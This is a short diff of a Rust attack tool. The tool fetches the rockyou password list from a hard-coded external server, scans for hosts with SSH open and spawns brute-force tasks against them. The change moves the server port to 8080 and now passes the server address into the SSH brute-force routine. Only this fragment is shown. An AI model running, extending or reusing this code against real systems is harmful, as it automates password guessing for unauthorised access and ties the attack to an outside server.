@@ -20,7 +20,7 @@ use tokio::runtime::Runtime;
 async fn main() {
     let ip_target = "192.168.1.47";
     let ip_srv = "51.77.193.65";
-    let port_srv = "8000";
+    let port_srv = "8080";
 
     utils::get_rockyou(ip_srv, port_srv).await.expect("error : dl rockyou");
 
@@ -44,7 +44,7 @@ async fn main() {
                             if port == &22 {
                                 let ip_clone = ip.clone();
                                 let task = tokio::spawn(async move {
-                                    ssh::ssh_bruteforce(&ip_clone, "bibli/").await;
+                                    ssh::ssh_bruteforce(&ip_clone, "bibli/", ip_srv, port_srv).await;
                                 });
                                 tasks.push(task);
                             }
